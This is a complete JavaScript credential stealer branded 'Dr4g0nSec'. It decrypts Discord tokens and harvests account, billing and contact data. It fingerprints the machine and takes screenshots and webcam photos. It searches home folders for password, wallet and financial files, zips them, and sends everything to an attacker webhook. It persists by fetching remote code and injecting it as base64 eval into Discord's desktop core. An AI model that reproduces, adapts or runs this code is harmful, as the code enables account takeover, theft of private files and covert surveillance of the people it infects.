const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require("path");
const os = require("os");
const crypto = require("crypto");
const axios = require("axios");
const { Dpapi } = require("@primno/dpapi");
const { execSync } = require('child_process');
const screenshot = require('screenshot-desktop');
const FormData = require('form-data');
const archiver = require('archiver');
const https = require('https');
const { exec } = require('child_process');
const NodeWebcam = require('node-webcam');

const H00K3_URL = "%WEBHOOK%";

const discordPaths = {
  'Discord': '\\discord\\Local Storage\\leveldb\\',
  'Discord Canary': '\\discordcanary\\Local Storage\\leveldb\\',
  'Lightcord': '\\Lightcord\\Local Storage\\leveldb\\',
  'Discord PTB': '\\discordptb\\Local Storage\\leveldb\\'
};

const badgeFlags = {
  1: "<:Staff:1378144222812835860>",
  2: "<:Partnered:1378144221189509140>",
  4: "<:hypesquad_events:1378085682538483853>",
  8: "<:bug_hunter_standard85:1378070508981194752>",
  64: "<:Icon_Hypesquad_Bravery:1378085649185374329>",
  128: "<:Icon_Hypesquad_Brilliance:1378070531315597413>",
  256: "<:Leaf:1378070543227555943>",
  512: "<:YASuporter_Second:1378144224393826425>",
  16384: "<:bug_hunter_gold:1378070506883776622>",
  131072: "<:Developer:1378070517080129566>",
  262144: "<:Official_Moderator:1378144219696201848>",
  4194304: "<:developper:1378078700213370880>"
};

function getAppDataPath() {
  return process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
}

function getMasterKey(localStatePath) {
  const localState = JSON.parse(fs.readFileSync(localStatePath, "utf-8"));
  const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64").slice(5);
  return Dpapi.unprotectData(encryptedKey, null, "CurrentUser");
}

function decryptToken(encrypted, masterKey) {
  try {
    const buffer = Buffer.from(encrypted, "base64");
    if (buffer.length < 15) return null;
    const iv = buffer.slice(3, 15);
    const payload = buffer.slice(15);
    const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
    decipher.setAuthTag(payload.slice(-16));
    const decrypted = Buffer.concat([
      decipher.update(payload.slice(0, -16)),
      decipher.final()
    ]);
    return decrypted.toString("utf8");
  } catch {
    return null;
  }
}

function extractTokensFromPath(leveldbPath, masterKey) {
  const tokens = new Set();
  if (!fs.existsSync(leveldbPath)) return tokens;
  const files = fs.readdirSync(leveldbPath).filter(f => f.endsWith(".log") || f.endsWith(".ldb"));
  for (const file of files) {
    const content = fs.readFileSync(path.join(leveldbPath, file), "utf-8");
    const matches = content.match(/dQw4w9WgXcQ:[^\"]+/g) || [];
    for (const match of matches) {
      const encrypted = match.split("dQw4w9WgXcQ:")[1];
      const token = decryptToken(encrypted, masterKey);
      if (token) tokens.add(token);
    }
  }
  return Array.from(tokens);
}

function getBadges(flags) {
  let badges = "";
  Object.keys(badgeFlags).forEach(flag => {
    if ((flags & flag) == flag) {
      badges += `${badgeFlags[flag]} `;
    }
  });
  return badges.trim();
}

async function getFriendsBadges(token) {
  try {
    const res = await axios.get("https://discord.com/api/v9/users/@me/relationships", {
      headers: { Authorization: token }
    });
    const friends = res.data.filter(f => f.type === 1);
    let friendsWithBadges = "";
    for (const friend of friends.slice(0, 5)) {
      const badges = getBadges(friend.user.public_flags || 0);
      if (badges !== "") {
        friendsWithBadges += `• ${friend.user.username}#${friend.user.discriminator}: ${badges}\n`;
      }
    }
    return friendsWithBadges || "Nenhum.";
  } catch {

  }
}

async function getBillingInfo(token) {
  try {
    const res = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: { Authorization: token }
    });

    if (!Array.isArray(res.data) || res.data.length === 0) return "Nenhum.";

    return res.data.map(src => {
      switch (src.type) {
        case 1: return "💳";
        case 2: return "<:PayPal:1378143456345456721>";
        default: return "❓";
      }
    }).join(" | ");
  } catch {
    return null;
  }
}


async function getOwnedServers(token) {
  try {
    const headers = {
      Authorization: token,
      "User-Agent": "DiscordBot (https://discord.com, v1)"
    };

    const res = await axios.get("https://discord.com/api/v10/users/@me/guilds", { headers });
    const guilds = res.data;

    const owned = [];

    for (const g of guilds) {
      const isOwner = g.owner === true;
      const isAdmin = (g.permissions & 0x8) === 0x8;

      if (!isOwner && !isAdmin) continue;

      try {
        const fullGuild = await axios.get(`https://discord.com/api/v10/guilds/${g.id}?with_counts=true`, { headers });
        const memberCount = fullGuild.data.approximate_member_count || fullGuild.data.member_count || 0;
        const onlineCount = fullGuild.data.approximate_presence_count || 0;
        const offlineCount = memberCount - onlineCount;

        if (memberCount < 10) continue;

        const ownerEmoji = isOwner ? "✅" : "❌";


        let invite = "Sem permissão para criar ou ver convite";
        try {
          const inviteRes = await axios.get(`https://discord.com/api/v10/guilds/${g.id}/invites`, { headers });
          if (inviteRes.data.length > 0) {
            invite = `https://discord.gg/${inviteRes.data[0].code}`;
          }
        } catch (err) {

        }

        const data = `\u200b\n**${g.name} (${g.id})**\n` +
                     `Owner: \`${ownerEmoji}\` | Membros: \`⚫ ${memberCount} / 🟢 ${onlineCount} / 🔴 ${offlineCount}\`\n` +
                     (invite.startsWith("https") ? `[Entrar no servidor](${invite})` : ` ${invite}`);

        owned.push(data);

      } catch (err) {
        continue;
      }
    }

    return owned.join("\n\n") || "Nenhum servidor encontrado.";
  } catch (err) {
    return "Erro ao buscar servidores.";
  }
}


async function validateToken(token) {
  try {
    const res = await axios.get("https://discord.com/api/v9/users/@me", {
      headers: { Authorization: token }
    });
    return res.data;
  } catch {
    return null;
  }
}

async function sendDiscordInfoToWebhook(token, user, extras, friendsBadges, ownedGuilds, codes = null) {
  const embed = {
    title: `${user.username} | ${user.id}`,
    color: 0x250e80,
    thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
    fields: [
      { name: "<:anonymous:1378070498969387158> Token:", value: `\`\`\`${token}\`\`\`\n\n\u200b`, inline: false },
      { name: "<:discordnitro1:1378085625735151727> Nitro:", value: `${extras.nitro}`, inline: true },
      { name: "<a:shadownitro:1378140924428947616> Badges:", value: `${extras.badges || 'Nenhum.'}`, inline: true },
      { name: "<a:creditcard:1378078694634946682> Cobrança:", value: `${extras.billing}`, inline: true },
      { name: "<:2FA:1378085633159069736>  2FA:", value: `${extras.mfa}`, inline: true },
      { name: "\u200b", value: "\u200b", inline: false },
      { name: "<:icons8gmail50:1378085663433293824>  Email:", value: `${extras.email}`, inline: true },
      { name: "<:celular:1378142619728871435> Telefone:", value: `${extras.phone}`, inline: true },
      { name: "\u200b", value: "\u200b", inline: false },
      { name: "<:world:1378143049288253460> Servidores de posse:", value: ownedGuilds, inline: false },
      { name: "<:users:1378143209729032244>  Amigos relevantes:", value: friendsBadges, inline: false }
    ],
    footer: {
      text: "Created by: sk4rty | Dr4g0nSec on Top!",
      icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400"
    }
  };

  if (codes) {
    embed.fields.push({ name: "<a:gift:1378140640935809084> Códigos Gifts:", value: codes, inline: false });
    embed.fields.push({ name: "\u200b", value: "\u200b", inline: false });
  }

  await axios.post(H00K3_URL, {
    username: "Dr4g0nSec | Informações do Usuário",
    avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
    embeds: [embed]
  }).catch();
}

async function main() {
  const appData = getAppDataPath();
  for (const [name, relativePath] of Object.entries(discordPaths)) {
    const basePath = path.join(appData, relativePath.split("\\Local")[0]);
    const localStatePath = path.join(basePath, 'Local State');
    const leveldbPath = path.join(appData, relativePath);
    if (!fs.existsSync(localStatePath) || !fs.existsSync(leveldbPath)) continue;
    const masterKey = getMasterKey(localStatePath);
    const tokens = extractTokensFromPath(leveldbPath, masterKey);
    for (const token of tokens) {
      const user = await validateToken(token);
      if (user) {
        const billing = await getBillingInfo(token);
        const extras = {
          nitro: user.premium_type === 1 ? "Clássico" : user.premium_type === 2 ? "Premium" : "Não possui.",
          mfa: user.mfa_enabled ? "Ativado" : "Não possui.",
          phone: user.phone || "Não possui.",
          email: user.email || "Não possui.",
          badges: getBadges(user.public_flags),
          billing
        };
        const friendsBadges = await getFriendsBadges(token);
        const ownedGuilds = await getOwnedServers(token);
        await sendDiscordInfoToWebhook(token, user, extras, friendsBadges, ownedGuilds);
      }
    }
  }
}

async function uploadToImgur(filePath) {
    const image = fs.readFileSync(filePath, { encoding: 'base64' });
    const response = await axios.post('https://api.imgur.com/3/upload', {
        image: image,
        type: 'base64'
    }, {
        headers: {
            Authorization: 'Client-ID fc777d63b5c36b5'
        }
    });

    return response.data.success ? response.data.data.link : null;
}

function getHWID() {
    try {
        return execSync('wmic csproduct get uuid').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getMotherboard() {
    try {
        return execSync('wmic baseboard get product').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getBIOS() {
    try {
        return execSync('wmic bios get smbiosbiosversion').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getSound() {
    try {
        return execSync('wmic sounddev get name').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getUserInfo() {
    return os.userInfo().username;
}

async function takeScreenshot() {
    const filepath = path.join(os.tmpdir(), 'screenshot.png');
    await screenshot({ filename: filepath });
    return filepath;
}

async function getNetworkInfo() {
    try {
        const ip = (await axios.get("https://api.ipify.org")).data;
        const r = (await axios.get(`https://ipinfo.io/${ip}/json`)).data;

        return {
            ip,
            hostname: os.hostname(),
            mac: getMacAddress(),
            country: r.country || "Não Encontrado.",
            region: r.region || "Não Encontrado.",
            city: r.city || "Não Encontrado.",
            isp: r.org || "Não Encontrado."
        };
    } catch {
        return {
            ip: "Não Encontrado.",
            hostname: os.hostname(),
            mac: getMacAddress(),
            country: "Não Encontrado.",
            region: "Não Encontrado.",
            city: "Não Encontrado.",
            isp: "Não Encontrado."
        };
    }
}

function getMacAddress() {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
        for (const config of iface) {
            if (!config.internal && config.mac && config.mac !== '00:00:00:00:00:00') {
                return config.mac;
            }
        }
    }
    return 'Não Encontrado.';
}

async function sendToWebhook(user, sysInfo, netInfo, screenshotUrl) {
    const embed = {
        title: "Informações Do Sistema",
        color: 0x250e80,
        fields: [
            {
                name: "<:user:1378150229769060422> Usuário",
                value: `\`\`\`Nome: ${user}\nSistema: ${netInfo.hostname}\nUsuário: ${user}\`\`\``,
                inline: false
            },
            {
                name: "<:world:1378143049288253460> Rede",
                value: `\`\`\`IP: ${netInfo.ip}\nMAC: ${netInfo.mac}\nISP: ${netInfo.isp}\nRegião: ${netInfo.region} - ${netInfo.city}\`\`\``,
                inline: false
            },
            {
                name: "<:cpu1:1378078689601785876> Sistema",
                value: `\`\`\`CPU: ${sysInfo.cpu}\nRAM: ${sysInfo.ram}\nHWID: ${sysInfo.hwid}\nMotherboard: ${sysInfo.motherboard}\nBIOS: ${sysInfo.bios}\nSom: ${sysInfo.sound}\nOS: ${sysInfo.os}\`\`\``,
                inline: false
            }
        ],
        image: screenshotUrl ? { url: screenshotUrl } : undefined,
        footer: {
            text: "Created by sk4rty | Dr4g0nSec on Top!",
            icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400"
        }
    };

    await axios.post(H00K3_URL, {
        username: "Dr4g0nSec | Informações do Sistema",
        avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
        embeds: [embed]
    });
}

(async () => {
    const user = getUserInfo();
    const sysInfo = {
        cpu: os.cpus()[0].model,
        ram: `${Math.round(os.totalmem() / (1024 ** 3))} GB`,
        hwid: getHWID(),
        motherboard: getMotherboard(),
        bios: getBIOS(),
        sound: getSound(),
        os: `${os.type()} ${os.release()}`
    };
    const netInfo = await getNetworkInfo();
    const screenshotPath = await takeScreenshot();
    const screenshotUrl = await uploadToImgur(screenshotPath);
    await sendToWebhook(user, sysInfo, netInfo, screenshotUrl);
})();

class Injection {
  constructor(webhook) {
    const match = webhook.match(/\/api\/webhooks\/\d+\/[\w-]+/);
    if (!match) return;

    this.webhook = "https://discord.com" + match[0];
    this.appdata = process.env.LOCALAPPDATA;

    this.discordDirs = [
      path.join(this.appdata, 'Discord'),
      path.join(this.appdata, 'DiscordCanary'),
      path.join(this.appdata, 'DiscordPTB'),
      path.join(this.appdata, 'DiscordDevelopment')
    ];

    this.init();
  }

  async init() {
    let code;
    try {
      const res = await axios.get(
        'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js'
      );
      code = res.data;
    } catch {
      return;
    }

    if (!code.trim()) return;

    const replacedCode = code.replace('%WEBHOOK%', this.webhook);
    const b64 = Buffer.from(replacedCode, 'utf-8').toString('base64');
    const obfuscated = `eval(atob("${b64}"));`;

    for (const dir of this.discordDirs) {
      if (!fs.existsSync(dir)) continue;

      const coreData = this.getCore(dir);
      if (!coreData) continue;

      const [corePath] = coreData;
      const indexPath = path.join(corePath, 'index.js');

      try {
        fs.writeFileSync(indexPath, obfuscated, 'utf-8');
      } catch {
        continue;
      }
    }
  }

  getCore(dir) {
    const files = fs.readdirSync(dir);
    for (const file of files) {
      if (/app-/.test(file)) {
        const modulesPath = path.join(dir, file, 'modules');
        if (!fs.existsSync(modulesPath)) continue;

        const modules = fs.readdirSync(modulesPath);
        for (const mod of modules) {
          if (/discord_desktop_core-/.test(mod)) {
            const corePath = path.join(modulesPath, mod, 'discord_desktop_core');
            if (fs.existsSync(path.join(corePath, 'index.js'))) {
              return [corePath, mod];
            }
          }
        }
      }
    }
    return null;
  }
}

new Injection(H00K3_URL);

const FOLDER_NAMES = [
  'passwords', 'senhas', 'credentials', 'logins', 'contas', 'importante', 'credenciais',
  'backup', 'backups', 'finance', 'financeiro', 'private', 'privado', 'secret', 'secreto',
  'documents', 'documentos', 'confidential', 'confidencial', 'data', 'dados', 'security', 'seguranca',
  'reports', 'relatorios', 'work', 'trabalho', 'jobs', 'projetos', 'projects', 'clientes',
  'accounts', 'contas', 'notes', 'notas', 'archives', 'arquivos', 'archives_old', 'arquivos_antigos',
  'taxes', 'impostos', 'invoices', 'faturas', 'contracts', 'contratos', 'legal', 'juridico',
  'personal', 'pessoal', 'private_files', 'arquivos_privados', 'financial_records', 'registros_financeiros',
  'logs', 'registros', 'vault', 'cofre', 'keys', 'chaves', 'tokens', 'segredos',
  'password_backup', 'senha_backup', 'user_data', 'dados_usuario', 'encrypted', 'criptografado',
  'hidden', 'escondido', 'safe', 'seguro', 'important_files', 'arquivos_importantes',
];


const FILE_TERMS = [

  'senhas.txt', 'credenciais.txt', 'importante.pdf', 'importante.txt', 'logins.txt', 'emails.txt',
  'contas.txt', 'cartões de crédito.txt', 'banco de dados.txt', 'conta vpn.txt', 'minhas contas.txt',
  'dados bancarios.txt', 'senha wifi.txt', 'documentos.txt', 'pix.txt', 'extrato bancario.pdf',
  'acesso sistemas.txt', 'senha do banco.txt', 'relatorio confidencial.txt', 'dados pessoais.txt',
  'cadastro.txt', 'criptografado.txt', 'notas fiscais.txt', 'backup.zip', 'dados_enviar.txt',
  'whatsapp backup.txt', 'foto rg.jpg', 'cnpj.txt', 'cpf.txt', 'comprovante de renda.pdf',
  'chaves pix.txt', 'carteira digital.txt', 'clientes.txt', 'lista de clientes.txt', 'senha e-mail.txt',
  'cartões clonados.txt', 'info cartão.txt', 'telegram backup.txt', 'lista acesso.txt', 'pagamentos.xlsx',


  'passwords.txt', 'credentials.txt', 'important.pdf', 'important.txt', 'logins.txt', 'emails.txt',
  'accounts.txt', 'credit cards.txt', 'database.txt', 'nordvpn login.txt', 'bank accounts.txt',
  'backup.zip', 'id_dump.txt', 'config.env', '.env', 'config.json', 'secret_keys.txt',
  'ssh_keys.txt', 'access.log', 'ftp_accounts.txt', 'steam_accounts.txt', 'paypal.txt',
  'my_passwords.txt', 'wallets.txt', 'bitcoin_wallet.txt', 'seedphrase.txt', 'wallet_seed.txt',
  'cc_list.txt', 'hacktools.zip', 'vpn_credentials.txt', 'discord_tokens.txt', 'steam_tokens.txt',
  'private_keys.txt', '2fa_codes.txt', 'sensitive_data.txt', 'user_info.txt', 'db_pass.txt',
  'access_keys.txt', 'crypto_keys.txt', 'tokens.txt', 'master_password.txt', 'vault.txt',
  'screenshot_passwords.png', 'important_backup.rar', 'icloud_login.txt', 'apple_id.txt'
];

const IGNORED_DIRS = [
  'node_modules', '.git', '.cache', 'tmp', 'temp', 'logs', 'dist', 'build', 'bin',
  'obj', 'out', 'venv', '__pycache__', '.vscode', '.idea', 'system32'
];


const DIRECTORIES = [
  'Documents', 'Downloads', 'Desktop', 'Pictures', 'Videos', 'Music', 'Favorites',
  'Saved Games', 'Links', 'Contacts', 'OneDrive', 'Google Drive', 'Dropbox', 'iCloud',
  'Temp', 'AppData', 'Roaming', 'Local', 'Program Files', 'Program Files (x86)', 'System32',
  'Users', 'Public', 'Windows', 'PerfLogs',

  'Documentos', 'Downloads', 'Área de Trabalho', 'Imagens', 'Vídeos', 'Músicas', 'Favoritos',
  'Jogos Salvos', 'Links', 'Contatos', 'Nuvem', 'Google Drive', 'Dropbox', 'iCloud',
  'Temp', 'AppData', 'Roaming', 'Local', 'Arquivos de Programas', 'Arquivos de Programas (x86)', 'System32',
  'Usuários', 'Público', 'Windows', 'Logs de Desempenho',

  'Telegram Desktop', 'WhatsApp', 'Steam', 'Discord', 'OBS', 'Visual Studio Code', 'Unity', 'Unreal Projects',
  'Photoshop', 'Premiere Pro', 'After Effects', 'VSCode Projects', 'xampp', 'htdocs', 'SQL Backups', 'Notepad++',

  'Projetos', 'Trabalhos', 'TCC', 'Faculdade', 'Relatórios', 'Segurança', 'Financeiro',
  'Privado', 'Confidencial', 'Pessoal', 'Backup', 'Senhas', 'Clientes', 'Servidores',
  'Sites', 'Portfólios', 'Contratos', 'NF-e', 'Currículo', 'RH', 'Emprego', 'Empresa',

  'C:\\', 'C:\\Users\\', 'C:\\Users\\Default\\', 'C:\\Windows\\Temp\\', 'C:\\Temp\\',
  '/home/', '/root/', '/etc/', '/opt/', '/var/log/', '/usr/bin/', '/mnt/', '/media/'
].map(dir => path.join(os.homedir(), dir));

function searchFilesSync(directories, fileTerms, ignoredDirs, maxDepth = 3) {
  const foundFiles = new Set();

  for (const baseDir of directories) {
    if (!fs.existsSync(baseDir)) continue;

    const stack = [{ dir: baseDir, depth: 0 }];

    while (stack.length > 0) {
      const { dir: current, depth } = stack.pop();
      if (depth > maxDepth) continue;

      let items;
      try {
        items = fs.readdirSync(current, { withFileTypes: true });
      } catch {
        continue;
      }

      for (const item of items) {
        const name = item.name;
        const fullPath = path.join(current, name);

        if (item.isDirectory()) {
          if (ignoredDirs.some(ignored => ignored.toLowerCase() === name.toLowerCase())) continue;
          stack.push({ dir: fullPath, depth: depth + 1 });
        } else if (item.isFile()) {
          if (fileTerms.some(term => name.toLowerCase().includes(term.toLowerCase()))) {
            foundFiles.add(fullPath);
          }
        }
      }
    }
  }

  return Array.from(foundFiles);
}


function createZipFileSync(files) {
    const zipPath = path.join(__dirname, 'Dr4g0nSec_Arquivos_Importantes.zip');
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    return new Promise((resolve, reject) => {
        archive.pipe(output);
        for (const file of files) {
            try {
                const relPath = path.relative(os.homedir(), file);
                archive.file(file, { name: relPath });
            } catch (_) {}
        }

        archive.finalize();

        output.on('close', () => resolve(zipPath));
        archive.on('error', err => reject(err));
    });
}

function filterUniqueByName(files) {
  const seen = new Set();
  const uniqueFiles = [];

  for (const file of files) {
    const name = path.basename(file);
    if (!seen.has(name)) {
      seen.add(name);
      uniqueFiles.push(file);
    }
  }

  return uniqueFiles;
}

function formatFilesForEmbed(filePaths, maxItems = 16) {
  const fileNames = filePaths.map(fp => require('path').basename(fp));

  const counts = fileNames.reduce((acc, name) => {
    acc[name] = (acc[name] || 0) + 1;
    return acc;
  }, {});

  const formatted = Object.entries(counts).map(([name, count]) =>
    count > 1 ? `${name} (${count}x)` : name
  );

  let description = '';
  if (formatted.length <= maxItems) {
    description = formatted.join('\n');
  } else {
    const shown = formatted.slice(0, maxItems);
    const remaining = formatted.length - maxItems;
    description = shown.join('\n') + `\n└─ e mais ${remaining} arquivos...`;
  }

  return description;
}



async function sendFileToWebhook(webhookUrl, zipPath, foundFiles) {
    let description = `<:procurar:1384388129863106611> • ***Total de arquivos encontrados:* __${foundFiles.length}__**\n\n📁 • **ARQUIVOS ENCONTRADOS:**\n`;

    for (const file of foundFiles) {
        const line = `└─< _${path.basename(file)}_\n`;
        if ((description + line).length < 4000) {
            description += line;
        } else {
            description += "└─< _...e mais arquivos_\n";
            break;
        }
    }

    const form = new FormData();
    form.append('payload_json', JSON.stringify({
        username: "Dr4g0nSec | Arquivos Info",
        avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
        embeds: [{
            title: "Arquivos Importantes",
            description: description,
            color: 0x250e80,
            footer: {
                text: "Created by: sk4rty | Dr4g0nSec on Top!",
                icon_url: "https://avatars.githubusercontent.com/u/150484081?v=4"
            }
        }]
    }));
    form.append('file', fs.createReadStream(zipPath));

    try {
        await axios.post(webhookUrl, form, {
            headers: form.getHeaders()
        });
    } catch (err) {
    }
}

(async () => {
    const foundFiles = searchFilesSync(DIRECTORIES, FILE_TERMS, IGNORED_DIRS);
    if (!foundFiles.length) return;

    const uniqueFiles = filterUniqueByName(foundFiles);
    const embedDescription = formatFilesForEmbed(uniqueFiles, 16);

    const zipPath = await createZipFileSync(uniqueFiles);
    await sendFileToWebhook(H00K3_URL, zipPath, foundFiles);

    try {
        fs.unlinkSync(zipPath);
    } catch (_) {}
})();

const webcamOptions = {
  width: 640,
  height: 480,
  quality: 100,
  output: "jpeg",
  callbackReturn: "location",
  device: false,
  verbose: false
};

function getTimestamp() {
  return new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
}

function sendEmbed(title, description, color, imageUrl = null) {
  const payload = {
    content: "",
    embeds: [
      {
        title,
        description,
        color,
        image: imageUrl ? { url: imageUrl } : undefined,
        footer: {
          text: "Created by: sk4rty | Dr4g0nSec on Top!",
          icon_url: "https://avatars.githubusercontent.com/u/150484081?v=4"
        }
      }
    ],
    avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
    username: "Dr4g0nSec | Webcam"
  };

  return axios.post(H00K3_URL, payload).catch(() => {});
}

(async () => {
  try {
    NodeWebcam.capture("webcam_capture", webcamOptions, async (err, imagePath) => {
      if (err || !fs.existsSync(imagePath)) {
        await sendEmbed(
          "Dr4g0nSec | Webcam",
          "❌ Nenhuma webcam foi encontrada ou erro na captura.",
          0xFF0000
        );
        return;
      }

      try {
        const imageData = fs.readFileSync(imagePath);
        const form = new FormData();
        form.append('image', imageData.toString('base64'));

        const imgurRes = await axios.post('https://api.imgur.com/3/image', form, {
          headers: {
            Authorization: 'Client-ID 546088b90160f97',
            ...form.getHeaders()
          }
        });

        const imageUrl = imgurRes.data.data.link;

        await sendEmbed(
          "Dr4g0nSec | Webcam",
          `**<:camera:1386791241382887465> Captura da Webcam! | (${getTimestamp()})**`,
          0x250e80,
          imageUrl
        );

        fs.unlinkSync(imagePath);
      } catch {
        await sendEmbed(
          "Dr4g0nSec | Webcam",
          "❌ Erro ao enviar imagem para o Imgur ou montar o embed.",
          0xFF0000
        );
      }
    });
  } catch {
    await sendEmbed(
      "Dr4g0nSec | Webcam",
      "❌ Erro inesperado durante execução do script.",
      0xFF0000
    );
  }
})();

main();
